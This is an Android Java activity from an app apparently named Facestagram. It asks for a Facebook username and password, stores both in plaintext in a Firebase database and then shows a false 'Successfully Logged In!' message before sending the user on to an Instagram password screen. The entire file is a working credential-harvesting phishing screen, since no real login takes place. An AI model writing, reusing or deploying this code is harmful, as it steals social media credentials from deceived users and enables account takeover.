package com.arunsudharsan.facestagram;

import android.app.ProgressDialog;
import android.content.Intent;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import android.widget.Toast;


import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;


public class FacebookPassword extends AppCompatActivity implements  View.OnClickListener{
    private Button savefb;
    private EditText usernamefb;
    private EditText pwdfb;


    private DatabaseReference databaseReference;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_facebook_password);


        savefb = (Button) findViewById(R.id.fbsaveBtn);
        usernamefb = (EditText) findViewById(R.id.fbnameEditText);
        pwdfb = (EditText) findViewById(R.id.fbpwdEditText);
        databaseReference = FirebaseDatabase.getInstance().getReference();
        Button btn_letsgo = (Button) findViewById(R.id.btn_letsgo);
        btn_letsgo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent i = new Intent(FacebookPassword.this,InstagramPassword.class);
                startActivity(i);
            }
        });
savefb.setOnClickListener(this);
    }

    private void saveUserinfo() {


        String fbusername = usernamefb.getText().toString().trim();
        String fbpassword = pwdfb.getText().toString().trim();
        fbuserinfo fbuserinfo = new fbuserinfo(fbusername,fbpassword);

        if(TextUtils.isEmpty(fbusername))
        {
            Toast.makeText(this,"Enter Username!",Toast.LENGTH_SHORT).show();
            return;
        }

        if(TextUtils.isEmpty(fbpassword))
        {
            Toast.makeText(this,"Enter password!",Toast.LENGTH_SHORT).show();

            return;
        }
        databaseReference.child("Facebook"+fbusername+"  ").setValue(fbuserinfo);
 Toast.makeText(this,"Successfully Logged In! Hit Lets Go! ",Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onClick(View view) {
        if (view ==savefb)
        {
            saveUserinfo();
        }
    }
}